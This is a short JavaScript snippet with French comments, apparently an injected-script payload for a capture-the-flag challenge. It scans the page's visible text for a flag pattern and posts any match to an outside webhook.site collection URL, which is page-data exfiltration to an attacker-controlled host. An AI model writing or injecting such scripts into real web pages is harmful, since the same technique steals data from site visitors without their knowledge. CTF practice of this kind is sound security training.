// Cherche le flag dans le texte visible
const flag = document.body.innerText.match(/{FLAG.*?}/);

// Envoie-le à ton webhook
if (flag) {
  fetch("https://webhook.site/47f29ef8-e11a-461c-be8f-d3e4a576eb30", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ flag: flag[0] })
  });
}
